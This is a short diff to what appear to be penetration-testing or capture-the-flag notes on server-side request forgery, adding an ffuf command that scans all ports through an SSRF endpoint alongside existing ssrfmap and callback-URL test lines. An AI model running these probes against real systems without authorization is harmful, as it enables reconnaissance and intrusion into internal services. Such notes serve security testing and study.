@@ -3,3 +3,7 @@
   input http://<myip>/test
 OR
   try python3 ssrfmap.py -u "http://vuln-site.com/page?url=BURP_COLLAB_URL"
+
+2. use ffuf to see which ports are open to ssrf
+  ffuf -u http://<boxname>/<subdirectory> -request ssrf.request -w <( seq 0 65535) -ac
+
